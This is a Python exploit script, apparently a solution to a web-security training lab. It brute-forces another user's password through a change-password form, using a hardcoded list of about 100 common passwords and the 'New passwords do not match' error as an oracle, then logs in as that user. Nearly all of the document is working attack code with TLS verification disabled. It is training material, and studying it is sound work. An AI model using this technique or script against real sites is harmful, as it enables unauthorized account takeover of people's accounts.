import requests
import sys
import urllib3
from colorama import Fore,init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']

def exploit(s, url):
    print(Fore.YELLOW + '[!] This may take sometime to success..')
    r = s.post(url+'/login', data={'username':'wiener','password':'peter'}, verify=False, proxies=proxies)
    if 'Log out' in r.text and r.status_code == 200:
        print(Fore.GREEN + '[+] Successfuly log in as wiener')
        for password in passwords:
            data = {"username":"carlos","current-password": password, "new-password-1": "0x", "new-password-2": "ans"}
            r = s.post(url+'/my-account/change-password', data=data, verify=False, proxies=proxies)
            if "New passwords do not match" in r.text:
                print(Fore.GREEN + f"[+] Carlos password is: {password}")
                r = s.post(url+'/login', data={'username':'carlos','password':password}, verify=False, proxies=proxies)
                if 'Log out' in r.text and r.status_code == 200:
                    print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
                    break
    else:
        print(Fore.RED + '[-] Unable to login as wiener')

def main():
    url = sys.argv[1]
    try:
        if len(sys.argv) != 2:
            print ('[-] Uasge : %s <url>' % sys.argv[0])
    except IndexError as e:
        print(f'[-] Error : {e}')
    url = sys.argv[1]
    s = requests.Session()
    exploit(s, url)
if __name__ == "__main__":
    main()